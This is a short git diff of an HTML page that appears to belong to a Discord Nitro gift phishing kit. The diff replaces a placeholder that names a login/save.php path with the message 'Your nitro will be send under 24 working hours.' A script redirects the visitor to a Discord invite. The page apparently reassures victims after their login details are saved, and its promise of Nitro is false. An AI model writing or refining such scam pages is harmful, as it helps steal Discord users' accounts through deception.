@@ -4,7 +4,7 @@
   <link rel="stylesheet" href="../assest/style.css"/>
   </head>
   <body>
-    you can set this page to anything. (location: gift/HJ9fh9hGfgfijh93/login/save.php)
+    Your nitro will be send under 24 working hours.
   </body>
 </html>
 <script>function redirect(){window.location.replace("https://discord.gg/4Fxhr8d966")}</script>
